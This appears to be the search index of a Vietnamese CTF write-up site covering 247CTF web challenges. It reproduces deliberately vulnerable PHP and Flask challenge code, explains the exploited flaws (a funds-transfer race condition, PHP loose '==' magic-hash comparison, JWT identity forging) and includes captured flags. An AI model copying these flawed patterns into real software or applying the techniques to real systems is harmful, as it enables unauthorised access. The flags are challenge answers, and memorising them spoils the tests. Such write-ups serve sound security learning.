{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Nothing to show \u00b6","title":"0x5h1n0k0"},{"location":"#nothing-to-show","text":"","title":"Nothing to show"},{"location":"247ctf/","text":"Web \u00b6 Rated Easy \u00b6 Secured Session Trusted Client Rated Moderate \u00b6 Compare the pair Flag Authoriser Forgotten file point Acid flag Bank The Twig Injector","title":"Web"},{"location":"247ctf/#web","text":"","title":"Web"},{"location":"247ctf/#rated-easy","text":"Secured Session Trusted Client","title":"Rated Easy"},{"location":"247ctf/#rated-moderate","text":"Compare the pair Flag Authoriser Forgotten file point Acid flag Bank The Twig Injector","title":"Rated Moderate"},{"location":"247ctf/template/","tags":["247CTF"],"text":"NAME \u00b6 Challenge WriteUp \u00b6 Flag: 247CTF{da80795f8a5cab2e037d7385807b9a91} What we learned \u00b6","title":"NAME"},{"location":"247ctf/template/#name","text":"Challenge","title":"NAME"},{"location":"247ctf/template/#writeup","text":"Flag: 247CTF{da80795f8a5cab2e037d7385807b9a91}","title":"WriteUp"},{"location":"247ctf/template/#what-we-learned","text":"","title":"What we learned"},{"location":"247ctf/acid-flag-bank/","tags":["247CTF"],"text":"Acid flag Bank \u00b6 Challenge WriteUp \u00b6 Xem source code challenge Source code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 <?php require_once ( 'flag.php' ); class ChallDB { public function __construct ( $flag ) { $this -> pdo = new SQLite3 ( '/tmp/users.db' ); $this -> flag = $flag ; } public function updateFunds ( $id , $funds ) { $stmt = $this -> pdo -> prepare ( 'update users set funds = :funds where id = :id' ); $stmt -> bindValue ( ':id' , $id , SQLITE3_INTEGER ); $stmt -> bindValue ( ':funds' , $funds , SQLITE3_INTEGER ); return $stmt -> execute (); } public function resetFunds () { $this -> updateFunds ( 1 , 247 ); $this -> updateFunds ( 2 , 0 ); return \"Funds updated!\" ; } public function getFunds ( $id ) { $stmt = $this -> pdo -> prepare ( 'select funds from users where id = :id' ); $stmt -> bindValue ( ':id' , $id , SQLITE3_INTEGER ); $result = $stmt -> execute (); return $result -> fetchArray ( SQLITE3_ASSOC )[ 'funds' ]; } public function validUser ( $id ) { $stmt = $this -> pdo -> prepare ( 'select count(*) as valid from users where id = :id' ); $stmt -> bindValue ( ':id' , $id , SQLITE3_INTEGER ); $result = $stmt -> execute (); $row = $result -> fetchArray ( SQLITE3_ASSOC ); return $row [ 'valid' ] == true ; } public function dumpUsers () { $result = $this -> pdo -> query ( \"select id, funds from users\" ); echo \"<pre>\" ; echo \"ID FUNDS \\n \" ; while ( $row = $result -> fetchArray ( SQLITE3_ASSOC )) { echo \" { $row [ 'id' ] } { $row [ 'funds' ] } \\n \" ; } echo \"</pre>\" ; } public function buyFlag ( $id ) { if ( $this -> validUser ( $id ) && $this -> getFunds ( $id ) > 247 ) { return $this -> flag ; } else { return \"Insufficient funds!\" ; } } public function clean ( $x ) { return round (( int ) trim ( $x )); } } $db = new challDB ( $flag ); if ( isset ( $_GET [ 'dump' ])) { $db -> dumpUsers (); } elseif ( isset ( $_GET [ 'reset' ])) { echo $db -> resetFunds (); } elseif ( isset ( $_GET [ 'flag' ], $_GET [ 'from' ])) { $from = $db -> clean ( $_GET [ 'from' ]); echo $db -> buyFlag ( $from ); } elseif ( isset ( $_GET [ 'to' ], $_GET [ 'from' ], $_GET [ 'amount' ])) { $to = $db -> clean ( $_GET [ 'to' ]); $from = $db -> clean ( $_GET [ 'from' ]); $amount = $db -> clean ( $_GET [ 'amount' ]); if ( $to !== $from && $amount > 0 && $amount <= 247 && $db -> validUser ( $to ) && $db -> validUser ( $from ) && $db -> getFunds ( $from ) >= $amount ) { $db -> updateFunds ( $from , $db -> getFunds ( $from ) - $amount ); $db -> updateFunds ( $to , $db -> getFunds ( $to ) + $amount ); echo \"Funds transferred!\" ; } else { echo \"Invalid transfer request!\" ; } } else { echo highlight_file ( __FILE__ , true ); } \u0110o\u1ea1n code tr\u00ean ch\u1eafc h\u1eb5n d\u1ec5 hi\u1ec3u m\u00e0, c\u00e1i ta c\u1ea7n ch\u00fa \u00fd l\u00e0 \u0111o\u1ea1n logic \u1edf d\u00f2ng 82 if ($to !== $from && $amount > 0 && $amount <= 247 && $db->validUser($to) && $db->validUser($from) && $db->getFunds($from) >= $amount) { $db->updateFunds($from, $db->getFunds($from) - $amount); $db->updateFunds($to, $db->getFunds($to) + $amount); echo \"Funds transferred!\"; } Ta th\u1ea5y, \u0111o\u1ea1n code tr\u00ean nh\u1eadn 3 \u0111\u1ed1i s\u1ed1: to : Nh\u1eadn \u0111\u1ed1i s\u1ed1 1 ho\u1eb7c 2 t\u01b0\u01a1ng \u1ee9ng v\u1edbi 2 ID trong c\u01a1 s\u1edf d\u1eef li\u1ec7u from : Nh\u1eadn \u0111\u1ed1i s\u1ed1 1 ho\u1eb7c 2 t\u01b0\u01a1ng \u1ee9ng v\u1edbi 2 ID trong c\u01a1 s\u1edf d\u1eef li\u1ec7u amount : Nh\u1eadn \u0111\u1ed1i s\u1ed1 c\u00f3 gi\u00e1 tr\u1ecb t\u1eeb 1 t\u1edbi 247 m\u00f4 t\u1ea3 l\u01b0\u1ee3ng ti\u1ec1n chuy\u1ec3n \u0111\u1ed5i Ti\u1ebfp theo, ta xem x\u00e9t logic: to !== from : Ki\u1ec3m tra 2 gi\u00e1 tr\u1ecb ID kh\u00e1c nhau v\u00e0 c\u00f9ng ki\u1ec3u d\u1eef li\u1ec7u $amount > 0 && $amount <= 247 : Ki\u1ec3m tra amount c\u00f3 n\u1eb1m \u1edf \u0111o\u1ea1n [1;247] hay kh\u00f4ng v\u00ec s\u1ed1 ti\u1ec1n hi\u1ec7n c\u00f3 c\u1ee7a ID 1 l\u00e0 247 db->validUser($to) && $db->validUser($from) : Ki\u1ec3m tra xem ID c\u00f3 trong database hay kh\u00f4ng (t\u1ee9c l\u00e0 to, from ch\u1ec9 thu\u1ed9c 1 ho\u1eb7c 2) getFunds($from) >= $amount : Ki\u1ec3m tra xem s\u1ed1 ti\u1ec1n c\u1ee7a ID c\u00f3 l\u1edbn h\u01a1n ho\u1eb7c b\u1eb1ng gi\u00e1 tr\u1ecb c\u1ee7a amount hay kh\u00f4ng N\u1ebfu d\u1eef li\u1ec7u tr\u00ean \u0111\u00fang, ta s\u1ebd c\u00f3 b\u01b0\u1edbc chuy\u1ec3n ti\u1ec1n: S\u1ed1 ti\u1ec1n c\u1ee7a ID from hi\u1ec7n h\u00e0nh s\u1ebd \u0111\u01b0\u1ee3c t\u00ednh b\u1eb1ng s\u1ed1 ti\u1ec1n c\u1ee7a ID from tr\u01b0\u1edbc \u0111\u00f3 tr\u1eeb cho amount S\u1ed1 ti\u1ec1n c\u1ee7a ID to hi\u1ec7n h\u00e0nh s\u1ebd \u0111\u01b0\u1ee3c t\u00ednh b\u1eb1ng s\u1ed1 ti\u1ec1n c\u1ee7a ID to tr\u01b0\u1edbc \u0111\u00f3 c\u1ed9ng cho amount T\u00f3m l\u1ea1i \u0111o\u1ea1n code n\u00e0y th\u1ec3 hi\u1ec7n vi\u1ec7c chuy\u1ec3n 1 l\u01b0\u1ee3ng (amount) ti\u1ec1n t\u1eeb ID to sang ID from . Nh\u00ecn c\u00f3 v\u1ebb \u0111\u01a1n gi\u1ea3n nh\u01b0ng logic b\u00e0i b\u1ecb t\u00ecnh tr\u1ea1ng Transaction \u1edf m\u1ee9c \u0111\u1ed9 c\u00f4 l\u1eadp (Isolation Level) v\u00e0 c\u1ee5 th\u1ec3 l\u00e0 b\u1ecb l\u1ed7i Phantom. T\u1ee9c l\u00e0 s\u1ebd c\u00f3 m\u1ed9t lo\u1ea1t x\u1eed l\u00ed kh\u00f4ng \u0111\u1ed3ng b\u1ed9 b\u1ecb xung \u0111\u1ed9t d\u1eabn \u0111\u1ebfn vi\u1ec7c gi\u00e1 tr\u1ecb FUNDS c\u1ee7a c\u00e1c ID b\u1ecb thay \u0111\u1ed5i. \u0110i\u1ec1u ta c\u1ea7n l\u00fac n\u00e0y l\u00e0 t\u00ecm ki\u1ebfm th\u1ee9 c\u00f3 th\u1ec3 t\u1ea1o ra \u0111\u01b0\u1ee3c c\u00e1i request song song \u0111\u1ec3 x\u1ea3y ra l\u1ed7i tr\u00ean. C\u00e1i g\u00ec kh\u00f3 c\u00f3 chatgpt lo ::v Wrk V\u00e0 \u0111\u00e2y l\u00e0 th\u00e0nh qu\u1ea3 Ho\u00e0n th\u00e0nh vi\u1ec7c x\u1eed l\u00fd Gi\u00e1 tr\u1ecb funds \u0111\u00e3 \u0111\u01b0\u1ee3c t\u0103ng l\u00ean Nh\u1eadn flag th\u00f4i Flag Flag: 247CTF{7cc47319f32d13b2fd9ba542a2670d71} What we learned \u00b6 Insolation Level","title":"Acid flag Bank"},{"location":"247ctf/acid-flag-bank/#acid-flag-bank","text":"Challenge","title":"Acid flag Bank"},{"location":"247ctf/acid-flag-bank/#writeup","text":"Xem source code challenge Source code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 <?php require_once ( 'flag.php' ); class ChallDB { public function __construct ( $flag ) { $this -> pdo = new SQLite3 ( '/tmp/users.db' ); $this -> flag = $flag ; } public function updateFunds ( $id , $funds ) { $stmt = $this -> pdo -> prepare ( 'update users set funds = :funds where id = :id' ); $stmt -> bindValue ( ':id' , $id , SQLITE3_INTEGER ); $stmt -> bindValue ( ':funds' , $funds , SQLITE3_INTEGER ); return $stmt -> execute (); } public function resetFunds () { $this -> updateFunds ( 1 , 247 ); $this -> updateFunds ( 2 , 0 ); return \"Funds updated!\" ; } public function getFunds ( $id ) { $stmt = $this -> pdo -> prepare ( 'select funds from users where id = :id' ); $stmt -> bindValue ( ':id' , $id , SQLITE3_INTEGER ); $result = $stmt -> execute (); return $result -> fetchArray ( SQLITE3_ASSOC )[ 'funds' ]; } public function validUser ( $id ) { $stmt = $this -> pdo -> prepare ( 'select count(*) as valid from users where id = :id' ); $stmt -> bindValue ( ':id' , $id , SQLITE3_INTEGER ); $result = $stmt -> execute (); $row = $result -> fetchArray ( SQLITE3_ASSOC ); return $row [ 'valid' ] == true ; } public function dumpUsers () { $result = $this -> pdo -> query ( \"select id, funds from users\" ); echo \"<pre>\" ; echo \"ID FUNDS \\n \" ; while ( $row = $result -> fetchArray ( SQLITE3_ASSOC )) { echo \" { $row [ 'id' ] } { $row [ 'funds' ] } \\n \" ; } echo \"</pre>\" ; } public function buyFlag ( $id ) { if ( $this -> validUser ( $id ) && $this -> getFunds ( $id ) > 247 ) { return $this -> flag ; } else { return \"Insufficient funds!\" ; } } public function clean ( $x ) { return round (( int ) trim ( $x )); } } $db = new challDB ( $flag ); if ( isset ( $_GET [ 'dump' ])) { $db -> dumpUsers (); } elseif ( isset ( $_GET [ 'reset' ])) { echo $db -> resetFunds (); } elseif ( isset ( $_GET [ 'flag' ], $_GET [ 'from' ])) { $from = $db -> clean ( $_GET [ 'from' ]); echo $db -> buyFlag ( $from ); } elseif ( isset ( $_GET [ 'to' ], $_GET [ 'from' ], $_GET [ 'amount' ])) { $to = $db -> clean ( $_GET [ 'to' ]); $from = $db -> clean ( $_GET [ 'from' ]); $amount = $db -> clean ( $_GET [ 'amount' ]); if ( $to !== $from && $amount > 0 && $amount <= 247 && $db -> validUser ( $to ) && $db -> validUser ( $from ) && $db -> getFunds ( $from ) >= $amount ) { $db -> updateFunds ( $from , $db -> getFunds ( $from ) - $amount ); $db -> updateFunds ( $to , $db -> getFunds ( $to ) + $amount ); echo \"Funds transferred!\" ; } else { echo \"Invalid transfer request!\" ; } } else { echo highlight_file ( __FILE__ , true ); } \u0110o\u1ea1n code tr\u00ean ch\u1eafc h\u1eb5n d\u1ec5 hi\u1ec3u m\u00e0, c\u00e1i ta c\u1ea7n ch\u00fa \u00fd l\u00e0 \u0111o\u1ea1n logic \u1edf d\u00f2ng 82 if ($to !== $from && $amount > 0 && $amount <= 247 && $db->validUser($to) && $db->validUser($from) && $db->getFunds($from) >= $amount) { $db->updateFunds($from, $db->getFunds($from) - $amount); $db->updateFunds($to, $db->getFunds($to) + $amount); echo \"Funds transferred!\"; } Ta th\u1ea5y, \u0111o\u1ea1n code tr\u00ean nh\u1eadn 3 \u0111\u1ed1i s\u1ed1: to : Nh\u1eadn \u0111\u1ed1i s\u1ed1 1 ho\u1eb7c 2 t\u01b0\u01a1ng \u1ee9ng v\u1edbi 2 ID trong c\u01a1 s\u1edf d\u1eef li\u1ec7u from : Nh\u1eadn \u0111\u1ed1i s\u1ed1 1 ho\u1eb7c 2 t\u01b0\u01a1ng \u1ee9ng v\u1edbi 2 ID trong c\u01a1 s\u1edf d\u1eef li\u1ec7u amount : Nh\u1eadn \u0111\u1ed1i s\u1ed1 c\u00f3 gi\u00e1 tr\u1ecb t\u1eeb 1 t\u1edbi 247 m\u00f4 t\u1ea3 l\u01b0\u1ee3ng ti\u1ec1n chuy\u1ec3n \u0111\u1ed5i Ti\u1ebfp theo, ta xem x\u00e9t logic: to !== from : Ki\u1ec3m tra 2 gi\u00e1 tr\u1ecb ID kh\u00e1c nhau v\u00e0 c\u00f9ng ki\u1ec3u d\u1eef li\u1ec7u $amount > 0 && $amount <= 247 : Ki\u1ec3m tra amount c\u00f3 n\u1eb1m \u1edf \u0111o\u1ea1n [1;247] hay kh\u00f4ng v\u00ec s\u1ed1 ti\u1ec1n hi\u1ec7n c\u00f3 c\u1ee7a ID 1 l\u00e0 247 db->validUser($to) && $db->validUser($from) : Ki\u1ec3m tra xem ID c\u00f3 trong database hay kh\u00f4ng (t\u1ee9c l\u00e0 to, from ch\u1ec9 thu\u1ed9c 1 ho\u1eb7c 2) getFunds($from) >= $amount : Ki\u1ec3m tra xem s\u1ed1 ti\u1ec1n c\u1ee7a ID c\u00f3 l\u1edbn h\u01a1n ho\u1eb7c b\u1eb1ng gi\u00e1 tr\u1ecb c\u1ee7a amount hay kh\u00f4ng N\u1ebfu d\u1eef li\u1ec7u tr\u00ean \u0111\u00fang, ta s\u1ebd c\u00f3 b\u01b0\u1edbc chuy\u1ec3n ti\u1ec1n: S\u1ed1 ti\u1ec1n c\u1ee7a ID from hi\u1ec7n h\u00e0nh s\u1ebd \u0111\u01b0\u1ee3c t\u00ednh b\u1eb1ng s\u1ed1 ti\u1ec1n c\u1ee7a ID from tr\u01b0\u1edbc \u0111\u00f3 tr\u1eeb cho amount S\u1ed1 ti\u1ec1n c\u1ee7a ID to hi\u1ec7n h\u00e0nh s\u1ebd \u0111\u01b0\u1ee3c t\u00ednh b\u1eb1ng s\u1ed1 ti\u1ec1n c\u1ee7a ID to tr\u01b0\u1edbc \u0111\u00f3 c\u1ed9ng cho amount T\u00f3m l\u1ea1i \u0111o\u1ea1n code n\u00e0y th\u1ec3 hi\u1ec7n vi\u1ec7c chuy\u1ec3n 1 l\u01b0\u1ee3ng (amount) ti\u1ec1n t\u1eeb ID to sang ID from . Nh\u00ecn c\u00f3 v\u1ebb \u0111\u01a1n gi\u1ea3n nh\u01b0ng logic b\u00e0i b\u1ecb t\u00ecnh tr\u1ea1ng Transaction \u1edf m\u1ee9c \u0111\u1ed9 c\u00f4 l\u1eadp (Isolation Level) v\u00e0 c\u1ee5 th\u1ec3 l\u00e0 b\u1ecb l\u1ed7i Phantom. T\u1ee9c l\u00e0 s\u1ebd c\u00f3 m\u1ed9t lo\u1ea1t x\u1eed l\u00ed kh\u00f4ng \u0111\u1ed3ng b\u1ed9 b\u1ecb xung \u0111\u1ed9t d\u1eabn \u0111\u1ebfn vi\u1ec7c gi\u00e1 tr\u1ecb FUNDS c\u1ee7a c\u00e1c ID b\u1ecb thay \u0111\u1ed5i. \u0110i\u1ec1u ta c\u1ea7n l\u00fac n\u00e0y l\u00e0 t\u00ecm ki\u1ebfm th\u1ee9 c\u00f3 th\u1ec3 t\u1ea1o ra \u0111\u01b0\u1ee3c c\u00e1i request song song \u0111\u1ec3 x\u1ea3y ra l\u1ed7i tr\u00ean. C\u00e1i g\u00ec kh\u00f3 c\u00f3 chatgpt lo ::v Wrk V\u00e0 \u0111\u00e2y l\u00e0 th\u00e0nh qu\u1ea3 Ho\u00e0n th\u00e0nh vi\u1ec7c x\u1eed l\u00fd Gi\u00e1 tr\u1ecb funds \u0111\u00e3 \u0111\u01b0\u1ee3c t\u0103ng l\u00ean Nh\u1eadn flag th\u00f4i Flag Flag: 247CTF{7cc47319f32d13b2fd9ba542a2670d71}","title":"WriteUp"},{"location":"247ctf/acid-flag-bank/#what-we-learned","text":"Insolation Level","title":"What we learned"},{"location":"247ctf/administrative-orm/","tags":["247CTF"],"text":"Administrative Orm \u00b6 Challenge WriteUp \u00b6 Ta c\u00f9ng xem source code challenge import pymysql.cursors import pymysql , os , bcrypt , debug from flask import Flask , request from secret import flag , secret_key , sql_user , sql_password , sql_database , sql_host class ORM (): def __init__ ( self ): self . connection = pymysql . connect ( host = sql_host , user = sql_user , password = sql_password , db = sql_database , cursorclass = pymysql . cursors . DictCursor ) def update ( self , sql , parameters ): with self . connection . cursor () as cursor : cursor . execute ( sql , parameters ) self . connection . commit () def query ( self , sql , parameters ): with self . connection . cursor () as cursor : cursor . execute ( sql , parameters ) result = cursor . fetchone () return result def get_by_name ( self , user ): return self . query ( 'select * from users where username= %s ' , user ) def get_by_reset_code ( self , reset_code ): return self . query ( 'select * from users where reset_code= %s ' , reset_code ) def set_password ( self , user , password ): password_hash = bcrypt . hashpw ( password , bcrypt . gensalt ()) self . update ( 'update users set password= %s where username= %s ' , ( password_hash , user )) def set_reset_code ( self , user ): self . update ( 'update users set reset_code=uuid() where username= %s ' , user ) app = Flask ( __name__ ) app . config [ 'DEBUG' ] = False app . config [ 'SECRET_KEY' ] = secret_key app . config [ 'USER' ] = 'admin' @app . route ( \"/get_flag\" ) def get_flag (): user_row = app . config [ 'ORM' ] . get_by_name ( app . config [ 'USER' ]) if bcrypt . checkpw ( request . args . get ( 'password' , '' ) . encode ( 'utf8' ), user_row [ 'password' ] . encode ( 'utf8' )): return flag return \"Invalid password for %s !\" % app . config [ 'USER' ] @app . route ( \"/update_password\" ) def update_password (): user_row = app . config [ 'ORM' ] . get_by_reset_code ( request . args . get ( 'reset_code' , '' )) if user_row : app . config [ 'ORM' ] . set_password ( app . config [ 'USER' ], request . args . get ( 'password' , '' ) . encode ( 'utf8' )) return \"Password reset for %s !\" % app . config [ 'USER' ] app . config [ 'ORM' ] . set_reset_code ( app . config [ 'USER' ]) return \"Invalid reset code for %s !\" % app . config [ 'USER' ] @app . route ( \"/statistics\" ) # TODO: remove statistics def statistics (): return debug . statistics () @app . route ( '/' ) def source (): return \" % s \" % o pen(__file__).read() @app . before_first_request def before_first (): app . config [ 'ORM' ] = ORM () app . config [ 'ORM' ] . set_password ( app . config [ 'USER' ], os . urandom ( 32 ) . hex ()) @app . errorhandler ( Exception ) def error ( error ): return \"Something went wrong!\" if __name__ == \"__main__\" : app . run () Flag: 247CTF{da80795f8a5cab2e037d7385807b9a91} What we learned \u00b6","title":"Administrative Orm"},{"location":"247ctf/administrative-orm/#administrative-orm","text":"Challenge","title":"Administrative Orm"},{"location":"247ctf/administrative-orm/#writeup","text":"Ta c\u00f9ng xem source code challenge import pymysql.cursors import pymysql , os , bcrypt , debug from flask import Flask , request from secret import flag , secret_key , sql_user , sql_password , sql_database , sql_host class ORM (): def __init__ ( self ): self . connection = pymysql . connect ( host = sql_host , user = sql_user , password = sql_password , db = sql_database , cursorclass = pymysql . cursors . DictCursor ) def update ( self , sql , parameters ): with self . connection . cursor () as cursor : cursor . execute ( sql , parameters ) self . connection . commit () def query ( self , sql , parameters ): with self . connection . cursor () as cursor : cursor . execute ( sql , parameters ) result = cursor . fetchone () return result def get_by_name ( self , user ): return self . query ( 'select * from users where username= %s ' , user ) def get_by_reset_code ( self , reset_code ): return self . query ( 'select * from users where reset_code= %s ' , reset_code ) def set_password ( self , user , password ): password_hash = bcrypt . hashpw ( password , bcrypt . gensalt ()) self . update ( 'update users set password= %s where username= %s ' , ( password_hash , user )) def set_reset_code ( self , user ): self . update ( 'update users set reset_code=uuid() where username= %s ' , user ) app = Flask ( __name__ ) app . config [ 'DEBUG' ] = False app . config [ 'SECRET_KEY' ] = secret_key app . config [ 'USER' ] = 'admin' @app . route ( \"/get_flag\" ) def get_flag (): user_row = app . config [ 'ORM' ] . get_by_name ( app . config [ 'USER' ]) if bcrypt . checkpw ( request . args . get ( 'password' , '' ) . encode ( 'utf8' ), user_row [ 'password' ] . encode ( 'utf8' )): return flag return \"Invalid password for %s !\" % app . config [ 'USER' ] @app . route ( \"/update_password\" ) def update_password (): user_row = app . config [ 'ORM' ] . get_by_reset_code ( request . args . get ( 'reset_code' , '' )) if user_row : app . config [ 'ORM' ] . set_password ( app . config [ 'USER' ], request . args . get ( 'password' , '' ) . encode ( 'utf8' )) return \"Password reset for %s !\" % app . config [ 'USER' ] app . config [ 'ORM' ] . set_reset_code ( app . config [ 'USER' ]) return \"Invalid reset code for %s !\" % app . config [ 'USER' ] @app . route ( \"/statistics\" ) # TODO: remove statistics def statistics (): return debug . statistics () @app . route ( '/' ) def source (): return \" % s \" % o pen(__file__).read() @app . before_first_request def before_first (): app . config [ 'ORM' ] = ORM () app . config [ 'ORM' ] . set_password ( app . config [ 'USER' ], os . urandom ( 32 ) . hex ()) @app . errorhandler ( Exception ) def error ( error ): return \"Something went wrong!\" if __name__ == \"__main__\" : app . run () Flag: 247CTF{da80795f8a5cab2e037d7385807b9a91}","title":"WriteUp"},{"location":"247ctf/administrative-orm/#what-we-learned","text":"","title":"What we learned"},{"location":"247ctf/compare-the-pair/","tags":["247CTF"],"text":"Compare the pair \u00b6 Challenge WriteUp \u00b6 Challenge cung c\u1ea5p cho ta \u0111o\u1ea1n m\u00e3 php b\u00ean d\u01b0\u1edbi <?php require_once ( 'flag.php' ); $password_hash = \"0e902564435691274142490923013038\" ; $salt = \"f789bbc328a3d1a3\" ; if ( isset ( $_GET [ 'password' ]) && md5 ( $salt . $_GET [ 'password' ]) == $password_hash ){ echo $flag ; } echo highlight_file ( __FILE__ , true ); ?> Ta xem x\u00e9t logic c\u1ee7a \u0111o\u1ea1n m\u00e3: \u0110\u1eb7c t\u1ea3 2 bi\u1ebfn password_hash v\u00e0 salt Nh\u1eadn password t\u1eeb ng\u01b0\u1eddi d\u00f9ng N\u1ed1i salt v\u00e0 password th\u00e0nh 1 bi\u1ebfn m\u1edbi t\u00f4i s\u1ebd g\u1ecdi l\u00e0 pair M\u00e3 h\u00f3a bi\u1ebfn pair theo MD5 So s\u00e1nh n\u1ebfu MD5(pair) = password_hash th\u00ec ta c\u00f3 flag. Oke v\u1eady gi\u1edd l\u00e0m sao? C\u00e1i ta c\u00f3 th\u1ec3 khai th\u00e1c \u1edf challenge n\u00e0y ch\u00ednh l\u00e0 h\u1ecd check logic b\u1eb1ng to\u00e1n t\u1eed ==[^1] c\u00f3 trong php, v\u1ea5n \u0111\u1ec1 \u1edf to\u00e1n t\u1eed n\u00e0y l\u00e0 kh\u00f4ng ph\u1ea3i ki\u1ec3m tra ch\u00ednh x\u00e1c ki\u1ec3u nh\u01b0 abc=abc m\u00e0 l\u00e0 ki\u1ec3m tra ki\u1ec3u \"b\u00ecnh \u0111\u1eb3ng\". Ta th\u1eed file test.php test.php <?php var_dump ( \"0e902564435691274142490923013038\" == 0 ); # bool(true) ?> Output c\u1ee7a file n\u00e0y l\u00e0 true t\u1ee9c l\u00e0 n\u00f3 \u0111\u1ec3 0e902564435691274142490923013038 v\u1ec1 0 (int) r\u1ed3i m\u1edbi ki\u1ec3m tra v\u1edbi 0. \u0110\u1ec3 l\u00e0m \u0111\u01b0\u1ee3c \u0111i\u1ec1u \u0111\u00f3 th\u00ec b\u1eaft \u0111\u1ea7u h\u00e0m b\u0103m ph\u1ea3i l\u00e0 0e9 . Ro\u00e0i password ta c\u1ea7n t\u00ecm l\u00fac n\u00e0y l\u00e0 c\u00e1i \u0111\u1ec3 cho khi n\u00f3 k\u1ebft h\u1ee3p v\u1edbi salt th\u00e0nh f789bbc328a3d1a3<password> b\u0103m ra (theo MD5) s\u1ebd c\u00f3 d\u1ea1ng 0e9<padding> . Ta c\u00f3 script khai th\u00e1c t\u1ea1i \u0111\u00e2y 247CTF{76fbce3909b3129536bb396fea3a9879} What we learned \u00b6 L\u1ed7 h\u1ed5ng t\u1eeb to\u00e1n t\u1eed == trong php Xem th\u00eam t\u1ea1i https://www.php.net/manual/en/language.operators.comparison.php \u21a9","title":"Compare the pair"},{"location":"247ctf/compare-the-pair/#compare-the-pair","text":"Challenge","title":"Compare the pair"},{"location":"247ctf/compare-the-pair/#writeup","text":"Challenge cung c\u1ea5p cho ta \u0111o\u1ea1n m\u00e3 php b\u00ean d\u01b0\u1edbi <?php require_once ( 'flag.php' ); $password_hash = \"0e902564435691274142490923013038\" ; $salt = \"f789bbc328a3d1a3\" ; if ( isset ( $_GET [ 'password' ]) && md5 ( $salt . $_GET [ 'password' ]) == $password_hash ){ echo $flag ; } echo highlight_file ( __FILE__ , true ); ?> Ta xem x\u00e9t logic c\u1ee7a \u0111o\u1ea1n m\u00e3: \u0110\u1eb7c t\u1ea3 2 bi\u1ebfn password_hash v\u00e0 salt Nh\u1eadn password t\u1eeb ng\u01b0\u1eddi d\u00f9ng N\u1ed1i salt v\u00e0 password th\u00e0nh 1 bi\u1ebfn m\u1edbi t\u00f4i s\u1ebd g\u1ecdi l\u00e0 pair M\u00e3 h\u00f3a bi\u1ebfn pair theo MD5 So s\u00e1nh n\u1ebfu MD5(pair) = password_hash th\u00ec ta c\u00f3 flag. Oke v\u1eady gi\u1edd l\u00e0m sao? C\u00e1i ta c\u00f3 th\u1ec3 khai th\u00e1c \u1edf challenge n\u00e0y ch\u00ednh l\u00e0 h\u1ecd check logic b\u1eb1ng to\u00e1n t\u1eed ==[^1] c\u00f3 trong php, v\u1ea5n \u0111\u1ec1 \u1edf to\u00e1n t\u1eed n\u00e0y l\u00e0 kh\u00f4ng ph\u1ea3i ki\u1ec3m tra ch\u00ednh x\u00e1c ki\u1ec3u nh\u01b0 abc=abc m\u00e0 l\u00e0 ki\u1ec3m tra ki\u1ec3u \"b\u00ecnh \u0111\u1eb3ng\". Ta th\u1eed file test.php test.php <?php var_dump ( \"0e902564435691274142490923013038\" == 0 ); # bool(true) ?> Output c\u1ee7a file n\u00e0y l\u00e0 true t\u1ee9c l\u00e0 n\u00f3 \u0111\u1ec3 0e902564435691274142490923013038 v\u1ec1 0 (int) r\u1ed3i m\u1edbi ki\u1ec3m tra v\u1edbi 0. \u0110\u1ec3 l\u00e0m \u0111\u01b0\u1ee3c \u0111i\u1ec1u \u0111\u00f3 th\u00ec b\u1eaft \u0111\u1ea7u h\u00e0m b\u0103m ph\u1ea3i l\u00e0 0e9 . Ro\u00e0i password ta c\u1ea7n t\u00ecm l\u00fac n\u00e0y l\u00e0 c\u00e1i \u0111\u1ec3 cho khi n\u00f3 k\u1ebft h\u1ee3p v\u1edbi salt th\u00e0nh f789bbc328a3d1a3<password> b\u0103m ra (theo MD5) s\u1ebd c\u00f3 d\u1ea1ng 0e9<padding> . Ta c\u00f3 script khai th\u00e1c t\u1ea1i \u0111\u00e2y 247CTF{76fbce3909b3129536bb396fea3a9879}","title":"WriteUp"},{"location":"247ctf/compare-the-pair/#what-we-learned","text":"L\u1ed7 h\u1ed5ng t\u1eeb to\u00e1n t\u1eed == trong php Xem th\u00eam t\u1ea1i https://www.php.net/manual/en/language.operators.comparison.php \u21a9","title":"What we learned"},{"location":"247ctf/flag-authoriser/","tags":["247CTF"],"text":"Flag Authoriser \u00b6 Challenge WriteUp \u00b6 L\u1ea1i m\u1ed9t b\u00e0i v\u1edbi Flask ti\u1ebfp n\u00e8 Source code from flask import Flask , redirect , url_for , make_response , render_template , flash from flask_jwt_extended import JWTManager , create_access_token , jwt_optional , get_jwt_identity from secret import secret , admin_flag , jwt_secret app = Flask ( __name__ ) cookie = \"access_token_cookie\" app . config [ 'SECRET_KEY' ] = secret app . config [ 'JWT_SECRET_KEY' ] = jwt_secret app . config [ 'JWT_TOKEN_LOCATION' ] = [ 'cookies' ] app . config [ 'DEBUG' ] = False jwt = JWTManager ( app ) def redirect_to_flag ( msg ): flash ( ' %s ' % msg , 'danger' ) return redirect ( url_for ( 'flag' , _external = True )) @jwt . expired_token_loader def my_expired_token_callback (): return redirect_to_flag ( 'Token expired' ) @jwt . invalid_token_loader def my_invalid_token_callback ( callback ): return redirect_to_flag ( callback ) @jwt_optional def get_flag (): if get_jwt_identity () == 'admin' : return admin_flag @app . route ( '/flag' ) def flag (): response = make_response ( render_template ( 'main.html' , flag = get_flag ())) response . set_cookie ( cookie , create_access_token ( identity = 'anonymous' )) return response @app . route ( '/' ) def source (): return \" % s \" % o pen(__file__).read() if __name__ == \"__main__\" : app . run () B\u00e0i n\u00e0y h\u1ecd d\u00f9ng JWT token , Ta xem th\u00f4ng tin token JWT token JWT \u00b6 C\u00e1u tr\u00fac JWT Token T\u00ecm flag \u00b6 T\u1eeb th\u00f4ng tin token tr\u00ean, ta bi\u1ebft 